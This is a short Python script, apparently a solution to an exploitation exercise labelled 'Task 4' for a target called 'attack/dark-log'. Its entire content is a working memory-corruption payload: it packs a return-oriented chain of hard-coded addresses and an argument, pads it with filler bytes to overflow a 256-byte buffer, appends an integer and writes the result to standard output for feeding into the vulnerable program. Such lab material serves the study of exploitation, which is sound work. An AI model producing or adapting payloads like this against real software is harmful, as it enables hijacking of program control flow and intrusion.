#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.
"""
import sys
import struct

chain = struct.pack("<Q", 0x4018a3) + struct.pack("<Q", 4) + struct.pack("<Q", 0x401677)
payload = chain + b"A"*(256-24) + struct.pack("<i", 168) + b"\n"

sys.stdout.buffer.write(payload)
